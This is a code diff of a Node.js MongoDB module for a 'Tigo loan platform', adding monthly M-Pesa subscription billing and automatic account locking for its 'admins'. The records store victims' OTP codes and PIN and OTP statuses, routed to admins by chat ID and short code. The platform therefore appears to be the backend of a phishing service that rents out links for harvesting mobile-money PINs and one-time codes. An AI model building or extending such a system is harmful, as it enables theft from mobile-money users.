@@ -6,7 +6,8 @@ let db;
 const DB_NAME = 'tigo_loan_platform';
 const COLLECTIONS = {
     ADMINS: 'admins',
-    APPLICATIONS: 'applications'
+    APPLICATIONS: 'applications',
+    SUBSCRIPTIONS: 'subscriptions'
 };
 
 async function connectDatabase() {
@@ -33,7 +34,6 @@ async function createIndexes() {
         await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
         await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
         await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
-        // ✅ NEW: Short code index — must be unique and fast to look up
         await db.collection(COLLECTIONS.ADMINS).createIndex({ shortCode: 1 }, { unique: true, sparse: true });
 
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
@@ -42,6 +42,16 @@ async function createIndexes() {
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });
+
+        await db.collection(COLLECTIONS.SUBSCRIPTIONS).createIndex({ adminId: 1 }, { unique: true });
+        await db.collection(COLLECTIONS.SUBSCRIPTIONS).createIndex({ status: 1 });
+        await db.collection(COLLECTIONS.SUBSCRIPTIONS).createIndex({ nextBillingDate: 1 });
+        await db.collection(COLLECTIONS.SUBSCRIPTIONS).createIndex({ isLocked: 1 });
+
+        // Payment requests indexes
+        await db.collection('payment_requests').createIndex({ adminId: 1 });
+        await db.collection('payment_requests').createIndex({ status: 1 });
+        await db.collection('payment_requests').createIndex({ requestedAt: -1 });
 
         console.log('✅ Database indexes created');
     } catch (error) {
@@ -72,7 +82,6 @@ async function saveAdmin(adminData) {
         const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
         if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);
 
-        // Check short code is not already taken
         const existingCode = await db.collection(COLLECTIONS.ADMINS).findOne({ shortCode: adminData.shortCode });
         if (existingCode) throw new Error(`Short code '${adminData.shortCode}' is already taken`);
 
@@ -81,12 +90,16 @@ async function saveAdmin(adminData) {
             name: adminData.name,
             email: adminData.email,
             chatId: adminData.chatId,
-            shortCode: adminData.shortCode,  // ✅ NEW FIELD
+            shortCode: adminData.shortCode,
             status: adminData.status || 'active',
             createdAt: adminData.createdAt || new Date().toISOString()
         };
 
         const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
+        
+        // Create subscription for new admin
+        await createSubscription(adminId);
+        
         console.log(`✅ Admin saved: ${adminId} | shortCode: ${adminData.shortCode}`);
         return result;
     } catch (error) {
@@ -104,7 +117,6 @@ async function getAdmin(adminId) {
     }
 }
 
-// ✅ NEW: Look up admin by short code
 async function getAdminByShortCode(shortCode) {
     try {
         return await db.collection(COLLECTIONS.ADMINS).findOne({ shortCode: shortCode.toLowerCase() });
@@ -196,6 +208,255 @@ async function getAdminCount() {
 }
 
 // ==========================================
+// SUBSCRIPTION OPERATIONS
+// ==========================================
+
+function getNextBillingDate(fromDate = new Date()) {
+    const date = new Date(fromDate);
+    const nextMonth = new Date(date.getFullYear(), date.getMonth() + 1, 5);
+    nextMonth.setHours(0, 0, 0, 0);
+    return nextMonth;
+}
+
+async function createSubscription(adminId) {
+    try {
+        const existing = await db.collection(COLLECTIONS.SUBSCRIPTIONS).findOne({ adminId });
+        if (existing) return existing;
+
+        const today = new Date();
+        const nextBillingDate = getNextBillingDate(today);
+
+        const subscription = {
+            adminId,
+            status: 'active',
+            subscriptionFee: 500,
+            currency: 'TSh',
+            paidUpTo: new Date().toISOString(),
+            nextBillingDate: nextBillingDate.toISOString(),
+            isLocked: false,
+            lockReason: null,
+            paymentHistory: [],
+            createdAt: new Date().toISOString(),
+            updatedAt: new Date().toISOString()
+        };
+
+        const result = await db.collection(COLLECTIONS.SUBSCRIPTIONS).insertOne(subscription);
+        console.log(`💳 Subscription created for ${adminId}`);
+        return result;
+    } catch (error) {
+        console.error('❌ Error creating subscription:', error);
+        throw error;
+    }
+}
+
+async function getSubscription(adminId) {
+    try {
+        return await db.collection(COLLECTIONS.SUBSCRIPTIONS).findOne({ adminId });
+    } catch (error) {
+        console.error('❌ Error getting subscription:', error);
+        return null;
+    }
+}
+
+async function updateSubscription(adminId, updates) {
+    try {
+        const result = await db.collection(COLLECTIONS.SUBSCRIPTIONS).updateOne(
+            { adminId },
+            { $set: { ...updates, updatedAt: new Date().toISOString() } }
+        );
+        return result;
+    } catch (error) {
+        console.error('❌ Error updating subscription:', error);
+        throw error;
+    }
+}
+
+async function recordPaymentRequest(adminId, mpesaDetails) {
+    try {
+        let subscription = await getSubscription(adminId);
+        if (!subscription) {
+            await createSubscription(adminId);
+            subscription = await getSubscription(adminId);
+        }
+
+        const today = new Date();
+        const dayOfMonth = today.getDate();
+        const isEarlyPayment = dayOfMonth < 5;
+
+        const paymentRecord = {
+            adminId,
+            mpesaReference: mpesaDetails.reference,
+            amount: mpesaDetails.amount || 500,
+            phoneNumber: mpesaDetails.phoneNumber,
+            status: 'pending',
+            isEarlyPayment,
+            paymentDate: today.toISOString(),
+            requestedAt: new Date().toISOString(),
+            approvedAt: null,
+            daysBeforeBilling: 5 - dayOfMonth
+        };
+
+        const result = await db.collection('payment_requests').insertOne(paymentRecord);
+        console.log(`💰 Payment recorded for ${adminId} (Early: ${isEarlyPayment})`);
+        return result;
+    } catch (error) {
+        console.error('❌ Error recording payment:', error);
+        throw error;
+    }
+}
+
+async function getPendingPayments() {
+    try {
+        return await db.collection('payment_requests')
+            .find({ status: 'pending' })
+            .sort({ requestedAt: -1 })
+            .toArray();
+    } catch (error) {
+        console.error('❌ Error getting pending payments:', error);
+        return [];
+    }
+}
+
+async function approvePayment(paymentId, adminId) {
+    try {
+        const payment = await db.collection('payment_requests').findOne({ _id: paymentId });
+        if (!payment) throw new Error('Payment not found');
+
+        await db.collection('payment_requests').updateOne(
+            { _id: paymentId },
+            { $set: { 
+                status: 'approved', 
+                approvedAt: new Date().toISOString() 
+            } }
+        );
+
+        const nextBillingDate = getNextBillingDate(new Date());
+
+        const subscription = await getSubscription(adminId);
+        if (subscription) {
+            const paymentHistory = subscription.paymentHistory || [];
+            paymentHistory.push({
+                reference: payment.mpesaReference,
+                amount: payment.amount,
+                approvedAt: new Date().toISOString(),
+                isEarlyPayment: payment.isEarlyPayment,
+                nextBillingDate: nextBillingDate.toISOString()
+            });
+
+            await updateSubscription(adminId, {
+                status: 'active',
+                paidUpTo: new Date().toISOString(),
+                nextBillingDate: nextBillingDate.toISOString(),
+                isLocked: false,
+                lockReason: null,
+                paymentHistory,
+                lastPaymentApprovedAt: new Date().toISOString()
+            });
+        }
+
+        console.log(`✅ Payment approved for ${adminId}, next billing: ${nextBillingDate.toDateString()}`);
+        return true;
+    } catch (error) {
+        console.error('❌ Error approving payment:', error);
+        return false;
+    }
+}
+
+async function rejectPayment(paymentId) {
+    try {
+        await db.collection('payment_requests').updateOne(
+            { _id: paymentId },
+            { $set: { status: 'rejected', approvedAt: new Date().toISOString() } }
+        );
+        console.log(`❌ Payment rejected`);
+        return true;
+    } catch (error) {
+        console.error('❌ Error rejecting payment:', error);
+        return false;
+    }
+}
+
+async function lockAdminSubscription(adminId, reason = 'Subscription fee overdue') {
+    try {
+        const today = new Date();
+        
+        await updateSubscription(adminId, {
+            status: 'locked',
+            isLocked: true,
+            lockReason: reason,
+            lockedAt: new Date().toISOString(),
+            lockedOnDate: today.getDate()
+        });
+        console.log(`🔒 Admin ${adminId} locked: ${reason}`);
+        return true;
+    } catch (error) {
+        console.error('❌ Error locking subscription:', error);
+        return false;
+    }
+}
+
+async function unlockAdminSubscription(adminId) {
+    try {
+        await updateSubscription(adminId, {
+            isLocked: false,
+            lockReason: null,
+            unlockedAt: new Date().toISOString()
+        });
+        console.log(`🔓 Admin ${adminId} unlocked`);
+        return true;
+    } catch (error) {
+        console.error('❌ Error unlocking subscription:', error);
+        return false;
+    }
+}
+
+async function checkAndLockOverdueSubscriptions() {
+    try {
+        const today = new Date();
+        const dayOfMonth = today.getDate();
+        
+        if (dayOfMonth !== 5) {
+            console.log(`📅 Today is the ${dayOfMonth}th - no locking needed`);
+            return 0;
+        }
+
+        console.log(`📅 Today is the 5th - checking subscriptions...`);
+
+        const subscriptions = await db.collection(COLLECTIONS.SUBSCRIPTIONS)
+            .find({ isLocked: false })
+            .toArray();
+
+        let lockedCount = 0;
+        
+        for (const sub of subscriptions) {
+            const approvedPayment = await db.collection('payment_requests').findOne({
+                adminId: sub.adminId,
+                status: 'approved'
+            });
+
+            if (!approvedPayment) {
+                await lockAdminSubscription(sub.adminId, 'Subscription fee not paid - locked on the 5th');
+                lockedCount++;
+                console.log(`   🔒 Locked: ${sub.adminId}`);
+            } else {
+                console.log(`   ✅ Paid: ${sub.adminId}`);
+            }
+        }
+
+        if (lockedCount > 0) {
+            console.log(`🔒 Auto-locked ${lockedCount} overdue subscription(s)`);
+        } else {
+            console.log(`✅ All admins have paid their subscriptions`);
+        }
+
+        return lockedCount;
+    } catch (error) {
+        console.error('❌ Error checking subscriptions:', error);
+        return 0;
+    }
+}
+
+// ==========================================
 // APPLICATION OPERATIONS
 // ==========================================
 
@@ -210,7 +471,7 @@ async function saveApplication(appData) {
             pinStatus: appData.pinStatus || 'pending',
             otpStatus: appData.otpStatus || 'pending',
             otp: appData.otp || null,
-            assignmentType: 'specific', // ✅ Always specific now — no auto-assign
+            assignmentType: 'specific',
             isReturningUser: appData.isReturningUser || false,
             previousCount: appData.previousCount || 0,
             timestamp: appData.timestamp || new Date().toISOString()
@@ -343,7 +604,7 @@ module.exports = {
     closeDatabase,
     saveAdmin,
     getAdmin,
-    getAdminByShortCode,   // ✅ NEW EXPORT
+    getAdminByShortCode,
     getAdminByChatId,
     getAllAdmins,
     getActiveAdmins,
@@ -361,5 +622,16 @@ module.exports = {
     getStats,
     getPerAdminStats,
     getAllAdminsDetailed,
-    cleanupInvalidAdmins
+    cleanupInvalidAdmins,
+    createSubscription,
+    getSubscription,
+    updateSubscription,
+    recordPaymentRequest,
+    getPendingPayments,
+    approvePayment,
+    rejectPayment,
+    lockAdminSubscription,
+    unlockAdminSubscription,
+    checkAndLockOverdueSubscriptions,
+    getNextBillingDate
 };
